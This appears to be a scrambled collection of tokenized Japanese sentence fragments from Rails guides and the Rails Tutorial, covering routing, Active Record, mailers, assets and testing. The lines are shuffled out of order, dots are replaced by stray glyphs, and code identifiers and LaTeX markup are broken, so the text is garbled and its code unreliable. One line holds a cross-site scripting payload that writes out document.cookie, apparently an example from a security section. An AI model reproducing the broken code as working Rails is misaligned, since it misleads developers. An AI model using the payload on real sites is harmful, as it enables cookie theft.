コントローラ の ビュー と 同様 に 、 `yield ` を 使用 し て レイアウト 内 の ビュー を レンダリング でき ま す 。
前述 の よう に \ kode { current\ _user } ヘルパー を 定義 する と 、 リスト \ ref{ code :persistent_ current_user } の よう に な り ま す 。
\ href { http://guides▖ rubyonrails ▖org / }{ Rails ガイド } :   トピック 毎 に 分類 さ れ た 最新 の Rails リファレンス で す   ( 訳注 :   RailsGuides の 日本 語 版 を 「 Rails ガイド 」 と 呼 ん で い ま す ▟ )
本番 環境 の Web サーバー 設定 ファイル
*  ` action _mailer▖ logger`: ` Rails ▖ logger ` に 対 する 設定 が 行 わ れ て い な い 場合 に ` Action Mailer : : Base ▖ logger ` を 設定 し ま す 。
* `ActiveRecord : : QueryCache ` は 、 リクエスト に よ っ て 生成 さ れ た すべて の SELECT クエリ を キャッシュ し ま す 。
関連 付け は きわめて 便利 で す が 、 残念 ながら 全 自動 の 魔法 で は あ り ま せ ん 。
ログ アウト 用 リンク は リスト \ ref{ code : layout_ login_logout_links } で 既に 作成 済み な の で 、 ユーザー セッション を 破棄 する ため の 有効 な アクション を コントローラ で 作成 する だけ で 済 み ま す 。
せっかく な の で 、 自分 の プルリクエスト へ の 反応 を 待 っ て い る 間 に 、 他 の 人 の プルリクエスト を 開 い て コメント し て み ま しょ う 。
{ a :   1 ,  b :   2 ,  c: nil }▖ compact  # => { a :   1 ,  b :   2 }
本 ガイド の 前提 条件
#  validates : name ,   presence :  true
      <%= stylesheet_link_tag   " layout "  %>
*  `config▖ session_store ` は 、 通常 は ` config/initializers/session_store ▖ rb ` で 設定 さ れ る もの で あ り 、 セッション を 保存 する クラス を 指定 し ま す 。
*   双 方向 関連 付け
Rails   3 ▖ 0 から Rails   3 ▖ 1 へ の アップグレード
0 から 59 まで の 秒 を オプション に 持 ち 、 現在 時刻 の 秒 が 選択 さ れ て い る select タグ を 返 し ま す 。
* `: source `
コール バック の 詳細 に つ い て は [ Active   Record コール バック ガイド ] ( active_ record _ callbacks▖html ) を 参照 し て くださ い 。
@railstutorialjp  で Ruby   on   Rails を 学習 中 !
Rails の RESTful 構造 を 身体 に 叩きこ む に は 、 繰り返 し 学 ぶ の が 一番 で す ▟ Users リソース と Microposts リソース の 構造 の 類似 点 を 理解 する こと が 、 この 章 の 主要 な 目的 で す
`*_ path ` ヘルパー は 、 動作 の 性質 上 メール 内 で は 一切 使用 でき な い 点 に ご 注意 くださ い 。
Oh   dea▖▖▖ "
`<%=  ren der @ article ▖ comments %>` 呼び出し に よ っ て ` comment_counter ` ローカル 変数 が 返 さ れ ま す ▟ この 変数 は 自動 的 に 定義 さ れ 、 コメント を iterate する たび に カウント アップ し ま す 。
*  `geocoder_ path ` は `/ geocoder ` を 返 し ま す 。
    password :             '< パスワード > ' ,
12345 ▖ to_s(:human )              # =>  " 12 ▖ 3   Thousand "
作成 し た コード を リスト \ ref{ code :successful_edit_test } に 示 し ま す
$ bun dle   exec   rake   test   TEST = test/integration/users _ login_test ▖ rb
1234567890123 ▖ to_s(:human )      # =>  " 1 ▖ 23   Trillion "
NOTE :   定義 ファイル の 場所 は ` active_ support/core _ext/ module/attr_ internal ▖ rb ` で す 。
get  'photos/: id ' , to :  'photos# show ',   defaults: {  format :  'jpg '  }
#### `in_groups_of ( number ,  fill_ with  = nil ) `
ユーザー 一覧 ページ へ の リンク を 更新 する
$ bun dle   exec   rake   test
The   results  are   shown in   Figure   \ ref { fig: demo_micropost _model } ▖
たとえば 、 サイン イン 失敗 を テスト する に は 、 以下 の よう な シナリオ を 作成 し ま す 。
ブラウザ の アドレス バー に ` http://local host : 3000 ` と 入力 し て ' Go ' を 押 す と 、 ブラウザ   ( つまり クライアント )   は サーバー に 対 し て リクエスト を 1 つ 送信 し ま す 。
これ は リスト \ ref{ code :feed_item_ partial } で 使用 さ れ て い ま し た 。
def welcome_email ( user )
` pluralize ` メソッド は 、 レシーバ を 「 複数 形 」 に し た もの を 返 し ま す 。
保護 さ れ た ページ に アクセス し た とき の ページ の モックアップ ▟ \ href { http://railstutorial ▖org / images/figures/signin_ page _protected_mockup_bootstrap - full ▖ png } { ( 拡大 ) }
class   Computer  <  ActiveRecord : : Base
    resources  : accounts
duplicate▖push  'another - string '
次 の 単純 な Active   Record クラス を 例 に 取 っ て み ま しょ う 。
Action   Mailer を 使用 する メール の 受信 と 解析 は 、 メール 送信 に 比べ て やや 複雑 で す 。
scope  ' admin ' ,  as :  ' admin '  do
`unscope ` を 使用 し て 特定 の 条件 を 取り除 く こと が でき ま す 。
config ▖ assets▖ version   =   ' 1 ▖ 0 '
この メソッド は 、 \ kode {it } と \ kode {its } メソッド を 以下 の よう に 使 う こと で テスト でき ま す 。
= >   Word
デモ アプリケーション の ユーザー \ kode {index } アクション を 整理 し た もの 。
12355 5 1234 ▖ to_s(:phone )
しかし 、 パブリック な API の ルール は 若干 異な り ま す 。
####  テキスト を 出力 する
\ kode { heroku } コマンド に 以下 の 引数 を 与え る だけ で 、 正し い アドレス で ブラウザ が 起動 し ま す 。
さて 、 ` app/controllers/articles_controller▖ rb ` を 再度 開 い て み る と 、 残念 な こと に まだ ` create ` アクション で `@ article ▖ save ` の 結果 を 利用 する よう に な っ て い ま せ ん 。
上 を 実行 し た 出力 結果 の 中 に 、 以下 の よう な 警告 が 含 ま れ て い る はず で す 。
\ kode { name } 属性 に バリデーション に 対 する テスト  
{ 0 } 図 2 ▖ 16 { / 0 }   { 1 } User モデル と Micropost モデル の 継承 階層 { / 1 }
`encode _json ` フック の サポート
  @ article   =   Article▖ new
\ kode {update } アクション の テスト も 、 \ kode { create } アクション 用 の テスト と だいたい 同じ で す 。
関連 付け を 行な う の は 、 それ に よ っ て コード 内 で 一般 的 に 行 わ れ る 操作 を はるか に 簡単 に でき る から で す 。
te}╼╼    \ subsection { Heroku コマンド }╼    \ label{ sec : heroku_ commands }╼╼
上 の コード で は 、 リクエスト の 種類 に 応 じ て 、 続 く 行 の 中 から \emph { 1 つ だけ } が 実行 さ れ る こと に 注意 し て くださ い 。
文字 列 の 末尾
Flash の キー を 取り出 す と 常 に 文字 列 に な り ま す 。
    ren der   'edit'
production 環境 で 実際 に メール 送信 する 方法 に つ い て は \ ref{ sec : activation_email _ in_production } で 説明 し ま す 。
>> p▖ valid ?
javascript_url  " common "  # => http://www ▖example ▖ com/assets/ common ▖ js
#     < id type =" integer " > 44 04 < / id >
     def  prepare
      t▖ string     : order _number
連続 ドット は 省略 を 表 し て い る の で 、 他 の コード と 一緒 に コピー し な い よう ご 注意 くださ い
<%=  image_tag   " icons/ delete ▖ gif "  %>
この 関連 付け を 図 で 表 し た もの が 図 \ ref { fig : micropost _user_association } で す 。
    mod ▖ const_set ( const _ name ,   value )
N  =   Module ▖ new
Cloud 9 に 新し い ワークス ペース を 作成 する 。
       record ▖errors [ : name ]  <<  ' 名前 は X で 始ま る 必要 が あ り ま す ' 
Basic   HTTP   Authentication   Challenge ] ( images/getting _ started /challenge ▖ png )
\ kode {flash } 変数 に 代入 し た メッセージ は 、 リダイレクト し た 直後 の ページ で 表示 でき る よう に な り ま す 。
### `try `
" visualEffect " ▖un derscore   # => " visual_effect "
今度 は 、 ビュー など の   " テンプレート "   が 見当た ら な い と い う エラー メッセージ が 表示 さ れ ま す 。
      t ▖ belongs_to  : customer
[ ci  skip ]   は 「 ドキュメント のみ の 変更 」 以外 で は 使用 でき ま せ ん ▟ コード の 変更 に は 絶対 使用 し な い で くださ い 。
###  警告
< script> document ▖ write ( document▖ cookie ) ;</ script>
( \ kode {shared } ディレクトリ は { 1 } { 2 } 第 7 章 { / 2 } { / 1 } で 作成 し ま す ) 。
これ で テスト が   \ passing   に な る はず で す 。
|  ` LineItem`    | ` line _items`   |
これ は リスト \ ref{ code : layout_links_test _ signup _full_title_helper } で 使用 さ れ て い ま し た 。
上 の メソッド を 使用 すれ ば 、 \ kode {user ▖ following } に あ る 各 要素 の \ kode {id } を 呼び出 し 、 フォロー し て い る ユーザー の id の 配列 を 構成 する こと が でき ま す 。
たとえば 、 `style ▖css ` と い う アセット は 、 ` app/assets/stylesheets/style ▖css ` で は な く ` app/assets/stylesheets/ [ エンジン 名 ] /style ▖css ` に 置 か れ る 必要 が あ り ま す 。
{ 0 } 図 5 ▖ 7 { / 0 }   { 1 } Home ページ に footer を 追加 する { / 1 }
この 演習 を まだ や っ て い な い 場合 は 、 リスト \ ref{ code :gravatar _option } に 従 っ て Users ヘルパー ファイル を 更新 し て から 先 に 進 ん で くださ い 。
この 変更 に 備え て 、 テスト 実行 順 を 明示 的 に 指定 する ` active_ support▖ test _order ` と い う 新し い 設定 オプション が Rails   4 ▖ 2 に 導入 さ れ ま し た 。
パーシャル の 使用 方法 の 1 つ は 、 パーシャル を 一種 の サブ ルーチン の よう に みな す こと で す ▟ 詳細 な 表示 内容 を パーシャル 化 し て ビュー から 追い出 し 、 コード を 読 み やす く し ま す 。
#   現在 ログ イン 中 の ユーザー を 返 す   ( い る 場合 )
以下 は この ワーム に 関 する 技術 的 な 解説 で す 。
テスト の ドメイン ホスト を 設定 する
<%=   link_to  ' Ad   details ' ,  [@magazine ,  @ad ]  %>
ルーター は 、 ビュー で これ ら の パス や URL を 直接 ハード コード する こと を 避け る ため に パス や URL を 生成 する こと も でき ま す 。
この 行 に 対応 する URL 、 アクション 、 名前 付き ルート は { 0 } { 1 } 表 7 ▖ 1 { / 1 } { / 0 } の よう に な り ま す
unless @number ▖nil ?
\ kode {app/assets} :   現在 の アプリケーション 固有 の アセット
  @book   =  Book ▖find_ by ( id :   params [ : id ] )
Rails   4 ▖ 1 から Rails   4 ▖ 2 へ の アップグレード
Rails   エンジン 入門
app/assets/stylesheets/
有効 な メール フォーマット を テスト する   GREEN { 2 } { 3 } { / 3 } { 3 } { 4 } { / 4 } { / 3 } { 3 } { / 3}{ / 2 }
clients =  Client ▖ includes(:address) ▖ limit ( 10 )
#### `find `
*   Active   Support が 提供 する 拡張 機能 一覧
正規 表現 \ kode { VALID \_ EMAIL\_ REGEX } は \emph { 定数 } で す ▟ 大 文字 で 始ま る 名前 は Ruby で は 定数 を 意味 し ま す 。
    x   + =   1
ヒンズー 教 で は 、 アバター は 人間 や 動物 の 形 を と っ て 神 が 顕現 し た もの と 考え られ て い ま す 。
` collection<< ` メソッド は 、 結合 テーブル 上 で レコード を 作成 し 、 それ に よ っ て 1 つ また は 複数 の オブジェクト を コレクション に 追加 し ま す 。
記憶 ダイジェスト が \ kode {nil } に な る の で 、 bcrypt ライブラリ 内部 で 例外 が 発生 し ま す 。
これ は リスト \ ref{ code :user_create_action } で 使用 さ れ て い ま し た 。
作成 する テスト は 「 パッチ 」 の 形式 に し て もらえ る と ベスト で す ▟ 詳し く は 「 Rails の コード に 貢献 する 」 で 後述 し ま す 。
これ は リスト \ ref{ code :micropost _model_ image } で 使用 さ れ て い ま し た 。
User モデル が できあが っ た の で 、 いよいよ ユーザー 登録 機能 を 追加 し ま しょ う 。
customer▖ orders                 #  データベース から orders を 取得 する
既に この よう な ルーティング を 使用 し て い る 場合 は 、 以下 の 変更 が 必要 で す 。
| test/|Unit テスト 、 フィクスチャ など の テスト 関連 ファイル を ここ に 置 き ま す 。
    <td ><%=   link_to   " Remove " ,   book ,   method :  : delete ,   data: {  confirm :  " Are   you   sure ? "  
次 に 、 以下 の よう に \ kode {it } メソッド の 変種 を 使用 する こと に よ り 、 コード と 記述 を 1 行 に 収め ま す 。
これ ら の パラメータ は 、 受け取 っ た コントローラ 内 の アクション で 参照 可能 に な っ て お り 、 これ を 使用 し て 特定 の タスク を 実行 し ま す 。
< /ol >
( たとえば Heroku の Postgre SQL で は サポート さ れ て い ま す が 、 開発 用 の SQLite で は サポート さ れ て い ま せ ん ) 。
    論理 値 ?   ?
|   GET        | / kategorien/neu             |  categories#new     |  new_ category _ path       |
*  ` Rack : : Lock ` は 、 アプリケーション を ミューテックス で ラップ し 、 1 度 に 1 つ の スレッド で しか 呼び出 さ れ な い よう に し ま す 。
@orders = @customer▖ orders
ビルト イン の バリデーション ヘルパー は 、 デフォルト で は 保存 時 に 実行 さ れ ま す ▟ これ は レコード の 作成 時 および 更新 時 の どちら の 場合 に も 行 わ れ ま す 。
self を 省略 し た 結果 を リスト \ ref{ code :user_reverse_relationships } に 示 し ま す 。
* `: as ` 関連 付け と 併用 する こと は でき ま せ ん 。
*  ` add_builtin_route ` :   アプリケーション が development 環境 で 動作 し て い る 場合 、 ` rails/info/properties ` へ の ルーティング を アプリケーション の ルーティング に 追加 し ま す 。
\ kode {store _location } メソッド を 、 サイン イン し た ユーザー の before_filter に 追加 する 。
この 新し い カラム を 追加 する に は 、 エンジン の ディレクトリ で 以下 の コマンド を 実行 する 必要 が あ り ま す 。
 # => true
TIP: ` with _options ` は メソッド を レシーバ に 転送 し て い る の で 、 呼び出し を ネスト する こと も でき ま す 。
    i  =   Item▖ lock ( " LOCK   IN   SHARE   MODE " ) ▖ find ( 1 )
ハッシュ の ` : locale ` キー は 、 単に その テンプレート が 何語 向け な の か を 示 し て い ま す 。
### ` sum `
これ ら の アサーション から は ` Action Controller : : RoutingError ` の 代り に ` Assertion ` が 発生 する よう に な り ま し た 。
WARNING:  ` has_and _belongs_to_many ` 関連 付け で 使用 する 結合 テーブル に この よう な 余分 な カラム を 追加 する こと は お 勧め でき ま せ ん 。
引数 と し て カラム 名 の リスト を 与え る と 、 指定 し た カラム の 値 の 配列 を 、 対応 する データ 型 で 返 し ま す 。
さらに 、 置き換え られ る オブジェクト は 、 これ は 外部 キー が 変更 さ れ た こと に よ っ て すべて 自動 的 に 保存 さ れ ま す 。
さらに 、 テーブル に 含 ま れ て い る 各行 の カラム を 、 作成 し た モデル の インスタンス の 属性 に マッピング し ま す 。
      t▖ string   : part _number
    options [ : counter_cache ]
結局 テスト は いつ 行 え ば よ い の か
| ` perform_ deliveries `| Mail の メッセージ に ` deliver ` メソッド を 実行 し た とき に 実際 に メール 配信 を 行な う か どう か を 指定 し ま す 。
アセット パイプライン を 使用 する ため に 以下 の 変更 が 必要 で す 。
#   Active   Job を 使用 し て 後 で メール 送信 し た い 場合 は # deliver_ later を 使用
[ RedCloth ] ( http://redcloth ▖org/ ) は Ruby 用 に 開発 さ れ た マーク アップ 言語 の 一種 で す が 、 気 を 付け て 使用 し な い と XSS に 対 し て も 脆弱 に な り ま す 。
Bitbucket の 利用 開始 は 簡単 で す 。
コントローラ を 新規 作成 する ため の \ kode {rails } の スクリプト は \ kode {rails   generate  controller   ControllerName < action   name   ( 省略 可) > }▟ 訳注 :   コントローラ 名 は キャメル ケース 、 アクション 名 は スネーク ケース に する 。
私 たち の セキュリティ モデル で は 、 一般 ユーザー に は この 削除 リンク を 表示 し な い よう に し ま す 。
` config ▖ assets▖ logger ` を false に 設定 する と 、 アセット の ログ 出力 が オフ に な り ま す
    app▖config ▖ assets▖precompile   + =  % w ( admin ▖css   admin ▖ js)
`: controller ` や `: action ` を 除 き 、 どんな もの で も ` params ` の 一部 に 含め て アクション に 渡 す こと が でき ま す 。
Rails に は 、 ルーティング を 調べ る 機能 と テスト する 機能 が 備わ っ て い ま す 。
以上 で 、 ブログ に 記事 や コメント を 自由 に 追加 し て 、 それ ら を 正し い 場所 に 表示 でき る よう に な り ま し た 。
デフォルト は ` config/ locales/*▖{yml , rb } ` で す 。
実行 し た 結果 の Micropost モデル の 構造 は 図 \ ref { fig : micropost _model } の よう に な り ま す 。
まったく 馬鹿げ て い ま す 。
好み に 応 じ て 、 更新 し た アプリケーション を Heroku に 展開 し て も 構 い ま せ ん 。
上 に 示 し た とおり 、 Rails の 他 の ジェネレータ 同様 の 方法 で メイラー を 生成 でき ま す 。
< body >
これ は リスト \ ref{ code :edit_tests_ signed_ in } で 使用 さ れ て い ま し た 。
    @ article   =   Article ▖find ( params [ : article _ id ] )
再び ` config/ routes▖rb ` ファイル を 開 き 、 以下 の よう に 変更 し て くださ い 。
ren der  " books/edit▖html ▖erb "
### ` has_many ` 関連 付け
それ で は マイグレーション を 実行 し て blorgh _ comments テーブル を 生成 し て み ま しょ う 。
プロジェクト を 開 く
* * `Rack : : MethodOverride ` * *
\ kode { picture } 属性 を 追加 し た マイクロ ポスト の データ モデル
` Capfile ` に 以下 を 追加 し ま す 。
{ 0 } 図 7 ▖ 15 { / 0 }   { 1 } ユーザー 登録 失敗 { / 1 }
7 ▖ ▖ 11 )    # => true
たとえば 、 ダブル クォート を 使 っ て 文字 列 の インスタンス を 作成 し ま し た が 、 これ は 文字 列 の オブジェクト を 暗黙 で 作成 する \emph { リテラル コンストラクタ } で す 。
self を 省略 し た 結果 を リスト \ ref{ code : signed_ in_user_ index } に 示 し ま す 。
たとえば 、 ` app/assets` 、 ` lib/assets` 、 また は ` vendor/assets ` の 下 に あ る ` javascripts ` の 下 に あ る Java Script ファイル に リンク し た い 場合 は 以下 の よう に し ま す 。
\ kode { destroy } アクション を 改造 し 、 管理 者 が 自分 自身 を 削除 でき な い よう に し て くださ い 。
メイラー   ( mailer )   の テスト ケース で は 、 テスト する クラス の 名前 から テスト 対象 の メイラー を 取得 する の に ` constantize ` メソッド を 使用 し ま す 。
` application ▖rb ` の 場合 。
  end
`titleize ` メソッド は 、 レシーバ の 語 の 1 文字 目 を 大 文字 に し ま す 。
\ kode {center } クラス に \ kode { text - align :  center } プロパティ を 関連 付け て い ま す 。
assemblies ▖w here ( ▖▖▖)
変更 内容 を 説明 し ま す ▟ Rails の すべて の モデル は 初期 化 時 に 属性 ( フィールド ) を 与え られ 、 それ ら は データベース カラム に 自動 的 に 対応 付け られ ま す 。
      #  この ブロック は コンソール で 実行 さ れ る とき しか 呼び出 さ れ な い
最後 に もう ひと つ 小技 を お 教え し ま す 。
#### `at ( position ) `
   class   Application  <  Rails : : Application
上 の マイ グレーション コード は データベース に 依存 し て い な い こと に ご 注目 くださ い ▟ My SQL 、 Postgre SQL 、 Oracle など 多く の データベース に 対 し て 実行 でき ま す 。
{ 0 } 図 5 ▖ 4 { / 0 } { 1 } スペース や 共通 スタイル を 追加 し た 結果 ▟ \ href { http://railstutorial ▖org / images/figures/sample_app_universal _ 4 _ 0 - full ▖ png } { ( 拡大 ) } { / 1 }
この 節 の コード で 、 Micropost モデル と インターフェイス が 完成 し ま し た ▟ すべて の テスト が パス する はず で す 。
上 に よ っ て 、 ` admin _photos_ path ` と ` admin _accounts_ path ` など の ルーティング が 生成 さ れ ま す ▟ これ ら は `/admin /photos` と `/admin/accounts ` に それぞれ 割り当て られ ま す 。
たとえば 、 エンジン で しか 使用 し な い 管理 機能 を 作成 し た と し ま しょ う 。
Client▖ pluck(:id ,  : name )
MD 5 は コンパイル さ れ る ファイル の 内容 を 元 に プリ コンパイル 中 に 生成 さ れ 、 ファイル 名 に 挿入 さ れ て ディスク に 保存 さ れ ま す 。
{ 0 } 図 7 ▖ 14 { / 0 }   { 1 } ユーザー 登録 が 失敗 し た とき の モックアップ ▟{{ / 1 }
\ ref{ sec : ren dering _microposts } の ユーザー マイクロ ポスト の テンプレート 作成 作業 の 成果 は 、 何 と も 拍子 抜け で し た 。
NOTE :   定義 ファイル の 場所 は ` active_ support/core _ext/ module/remove_ method ▖ rb ` で す 。
この コード は \ kode {update } アクション で も 同様 で し た 。
ミドルウェアスタック に ミドルウェア を 追加 し たり 、 削除 し たり 、 変更 し たり する に は ` application ▖rb ` もしくは 環境 ごと の ` environments/<environment > ▖rb ` ファイル 内 で ` config▖ mid dleware ` を いじ り ま す 。
   validates :title ,   presence :  true ,
    when   ' Reviewer'
# =>  ActiveRecord : : Record Invalid :   Validation  failed :  Orders  count   can't   be blank
たとえば 、 ` viewable_by ` カラム と ` locked ` カラム だけ を 取り出 し た い 場合 は 以下 の よう に し ま す 。
を テーマ
production 環境 の プレフィックス は `/assets ` の まま で す 。
   belongs_to  : document
       create       test/controllers/microposts_controller_test ▖ rb
*  `config▖ cache_store ` は Rails で の キャッシュ 処理 に 使用 さ れ る キャッシュ ストア を 設定 し ま す 。
詳細 に つ い て は 、 ` Action Controller : : Caching : : Fragments ` を 参照 し て くださ い 。
12355 5 1234 ▖ to_s(:phone ,   area_code :  true ,   extension :   55 5 )
` : instance_ writer ` を `false ` に 設定 すれ ば 、 writer インスタンス メソッド は 生成 さ れ ま せ ん 。
この 時点 で 以下 を 実行 する と 、 テスト スイート が 赤色   ( 失敗 )   に な る はず で す 。
上 を 実行 する と クライアント が 最大 で 5 つ 返 さ れ ま す ▟ オフセット は 指定 さ れ て い な い の で 、 最初 の 5 つ が テーブル から 取り出 さ れ ま す 。
1 つ の クラス メソッド に は 複数 の シンボル を 渡 す こと が でき ま す ▟ バリデーション は 、 登録 さ れ た とおり の 順序 で 実行 さ れ ま す 。
Rails 実行 前 に コード を 実行 する
$  rails  s
< h 3 > New  comment < / h 3 >
Contact ページ 用 の アクション を 追加 する   (  \failing   )
ひと つ は 、 \ ref{ sec :a_user_ class } で や っ た よう に 属性 を 個別 に 代入 する 方法 で す 。
####  submit_tag
    mime_ version :   " 1 ▖ 0 " ,
HTTP / 1 ▖ 1   30 2   Moved  Temporarily
既に RubyGems が インストール さ れ て い る 場合 は 、 システム を チュートリアル で 使 わ れ て い る バージョン に 更新 し て くださ い 。
" author_ id " ▖ humanize ( capitalize:  false )  # => " author "
Symbol )   ?
``` bash
$   mv   README ▖ rdoc  README ▖ md
</ div>
      #top _menu  { display :   none }
以下 の 3 つ の メソッド を 使用 すれ ば 、 ほとんど の メール 送信 を カバー でき ま す 。
以下 の オプション は すべて ` i 18 n ` ( internationalization :   国際 化 ) ライブラリ 用 の オプション で す 。
この 方法 は 、 ルーティング の 記述 を 複雑 に せ ず 、 かつ 深 い ネスト を 作 ら な い と い う 絶妙 な バランス を 保 っ て い ま す 。
Active   Support で は ` past ? ` 、 ` today ? ` 、 `future ? ` を 示 す インスタンス 述語 も 定義 さ れ て お り 、 これ ら は すべて この ` Time▖ current ` を 起点 に し て い ま す 。
Action   Mailer に [ Mail   gem ] (https://github▖ com/mikel/ mail ) が 導入 さ れ た の で 、 ` config/ environments/$ RAILS _ ENV ▖ rb ` ファイル の 設定 は 以下 の よう に 非常 に 簡単 に な り ま し た 。
まず は パスワード 再 設定 の テスト ファイル を 生成 し ま しょ う 。
この 点 に 注意 し て お か な い と 、 バリデーション が 設定 さ れ て い る に も かかわ ら ず 、 データベース 上 の オブジェクト が 無効 な 状態 に な っ て しま う 可能 性 が あ り ま す 。
    x   + =   1
*   アセット を gem パッケージ に する
`ren der ` で `: plain ` オプション を 使用 する と 、 平文 テキスト を マーク アップ せ ず に ブラウザ に 送信 する こと が でき ま す 。
デフォルト は " ,   and   " で す 。
Rails で は 、 オブジェクト から JSON 形式 へ の 変換 と 、 変換 さ れ た JSON を ブラウザ に 送信 する 機能 が ビルト イン で サポート さ れ て い ま す 。
手順 を 追加 し た テスト を リスト \ ref{ code :user_ logout_test } に 示 し ま す 。
This   will   be  the  default   behavior   in  future  versions   of
#  config ▖mock_ with   : rr
</ul>
`qualified_const_defined ? ` は 以下 の よう に 動作 し ま す 。
指定 さ れ た 属性 に アクセス する ため の チェック ボックス タグ を 生成 し ま す 。
url_field(:user ,   :url)
はじめ に 、 デモ アプリケーション を どの よう な もの に する の か 、 計画 を 立て ま しょ う 。
   validates :email ,  uniqueness:  true ,   on : : create
アプリケーション の 初期 化 作業 に は 、 フレームワーク 自体 の 初期 化 、 エンジン の 初期 化 、 そして ` config/initializers ` に 記述 さ れ た すべて の アプリケーションイニシャライザ の 実行 が 含 ま れ ま す 。
WARNING: _ HTTP ヘッダ は 動的 に 生成 さ れ る もの で あ り 、 特定 の 状況 で は ヘッダ に ユーザー 入力 が 注入 さ れ る こと が あ り ま す 。
これ は リスト \ ref{ code :user_ show _microposts_test } で 使用 さ れ て い ま し た 。
( この 作業 で 煩わ さ れ る こと は 今後 あ り ま せ ん が 、 一 度 は この エラー ページ を 目 に し て お く の も よ い で しょ う ) 。
orders ( force_ reload   =  false )
*  `config ▖ assets▖js_ compressor ` は 、 Java Script の 圧縮 に 使用 する プログラム を 定義 し ま す 。
続 い て 、 Java Script ファイル の 重複 を 解消 し ま す 。
     var   =   foo
( ご 想像 どおり 、 Active   Record は \ kode {find_ by _ name } と い う メソッド も 自動 的 に 生成 し ま す ) 。
** ` ActionDispatch : : RemoteIp` **
#### ` to _xml `
` beginning _ of_ year ` は ` at_beginning _ of_ year ` の 別名 、 ` end _of_ year ` は ` at_end _of_ year ` の 別名 で す 。
|   NULL  |  NULL     |  NULL  |      1   |  Using   w here   |
####  javascript_ path
同様 に 、 ミドルウェア を スタック から 完全 に 取り除 く こと も でき ま す 。
\ kode {w here } メソッド を 使 う と 、 柔軟 で 強力 な データベース へ の 問い合わせ が 作成 でき る
    #  first _ name インスタンス reader は 生成 さ れ な い
@ articles  =  current_user▖ visible_ articles ▖w here ( name :   params [ : name ] )
Rails で は 関連 付け に ` dependent ` オプション を 指定 する こと で これ を 実現 し て い ま す 。
図 \ ref { fig: sqlite_database_browser } の 中 に \ kode {id } と い う マイグレーション の とき に 説明 さ れ な かっ た カラム の 存在 に 気づ い た か も しれ ま せ ん 。
非常 に 簡単 で は あ り ま す が 、 ついに Rails アプリケーション を 最後 まで 完成 さ せ ま し た 。
オプション の ハッシュ を 追加 する こと で 、 HTML 属性 を 指定 する こと も でき ま す 。
ここ まで で ユーザー プロファイル ページ が ひとまず 動作 する よう に な り ま し た の で 、 今度 は ユーザー 登録 フォーム を 作成 し ま しょ う 。
##### `: autosave `
今回 の 場合 、 必要 な の は フォーム の 値 の うち の 1 つ だけ で す 。
Via :   1 ▖ 1   vegur
*   Action   Mailer クラス と メイラー ビュー の 生成 および 編集 方法
` readonly ` を 指定 する と 、 関連 付け られ た オブジェクト を 取り出 す とき に 読み出し 専用 に な り ま す 。
「 welcome 」 は コントローラ 名 、 「 index 」 は コントローラ 内 の アクション で す 。
\ kode {Micropost } クラス に おけ る 継承
と い う の も 、 Web インターフェイス など で 便利 メソッド を 使 う の は まだ 先 な の で 、 すぐ に \emph { 使え る 場面 } が な く 、 実装 し た 手応え を 得 にく い から で す 。
    </html >
User モデル オブジェクト を シミュレート する ため の ファクトリー 。
提供 さ れ た 複数 の 情報 が 重複 し て お ら ず 、 競合 し て い る 場合 も 、 常 に 環境 変数 の 接続 設定 が 優先 さ れ ま す 。
####  メール を 複数 の 相手 に 送信 する
この ため 、 大 文字 を 区別 し な い で テスト する こと が 肝要 に な り 、 実際 の コード は リスト   \ ref{ code : validates_uniqueness _of_email _ case _ insensitive_test } の よう に な り ま す 。
# =>  [
Rails チーム は 、 ほとんど の 場合 モデル レベル の バリデーション が 最も 適切 で あ る と 考え て い ま す 。
modeling - users
どの Rails アプリケーション の 背後 に も 、 いく つ か の 標準 的 な ミドルウェア が 配置 さ れ て い ま す ▟ development 環境 で は 、 以下 の 順序 で ミドルウェア を 使用 し ま す 。
{ 0 } 図 7 ▖ 23 { / 0 }   { 1 } ブラウザ で ページ を 再 読み込 み する と 、 フラッシュ メッセージ が 表示 さ れ な く な る { / 1 }
( も し まだ データベース 上 に 一人 も ユーザー が い な い 場合 は 、 \ ref{ sec : creating_ and _authenticating _a_user } に 戻 っ て ユーザー を 追加 し て くださ い ▟ )
EXPLAIN   for :   SELECT  ` articles `▖
{ 0 } 図 12 ▖ 4 { / 0 }   { 1 } プロフィール に   [ Unfollow ]   ボタン が 表示 さ れ 、 フォロワー の カウント が 1 つ 増え た { / 1 }
    has_many  : orders ,
*   引数 が ` to_ary ` に 応答 する 場合 、 この メソッド が 呼び出 さ れ ま す 。
この 章 で は 、 Rails の 強力 な 機能 を いく つ か 紹介 する ため の デモ アプリケーション を 作成 し ま す 。
第 1 章 の 最後 に は 、 作成 し た アプリ を 早々 に 本番   ( production )   環境   ( {p 0 } )   に { 2 } デプロイ し て 一般 公開 する { / 2 } ところ まで 実践 し ま す 。
この オプション は 、 Rails が 生成 する ` config/ environments/production ▖rb ` で は false に 設定 さ れ ま す 。
取り込 ん だ 変更 は 納得 でき る 内容 か 。
作成 する ` Comment ` モデル は 、 記事 へ の 参照 を 保持 し ま す 。
{ 0 } リスト 2 ▖ 4 { / 0 } ╼╼ { 1 } Users コントローラ の 骨格   { 2 } { / 2 }   { 3 } app/controllers/users_controller▖ rb { / 3} { / 1 }
上 の コード の 中 に あ る 以下 の \ kode {dependent :  : destroy } オプション は 、
$  git  clone   git://github▖ com/rails/rails ▖ git
self を 省略 し た 結果 を リスト \ ref{ code : authorize_before_filter } に 示 し ま す 。
しかし 、 定数 と モジュール が 実質 上 切り離 さ れ る と 、 その モジュール オブジェクト は 到着 不能   ( unreachable )   に な り ま す 。
( この トピック に つ い て は 、 \ ref{ sec : remember_me } で より 深 く 解説 し て い き ま す ▟ )
|---------------|-------------|
     page   =   Page▖find_ by ( address :  email ▖ to ▖ first )
   user ▖ reset_password !
in ╼\end{ code }╼╼    \ subsection { Sessions コントローラ } %  ( fold) ╼    \ label{ sec : sessions_controller} ╼╼
以下 の よう な コード で ユーザー を 認証 でき る よう に な り ま す 。
###   名前 付き ルーティング
上 の 例 で も reading は 2 つ あ っ て 重複 し て い ま す 。
次 に 、 図 \ ref { fig : failed_ login_flash } と 図 \ ref { fig : flash_persistence } の 手順 を テスト コード で 再現 する 必要 が あ り ま す 。
Toy アプリ を 本番 環境 で 実行 する
$   cat  config/ database▖yml
Factory   Girl は 、 RSpec を 使用 し て Ruby で 「 ドメイン 特化 言語   ( domain- specific   language ) 」 を 定義 し ま す ▟ ここ で は 、 Active   Record の オブジェクト の 定義 に 特化 し て い ま す 。
` author ` 関連 付け は 、 この 時点 で は あえて ` User ` クラス と ハード コード し て お き ま す 。
####   パス の 検索
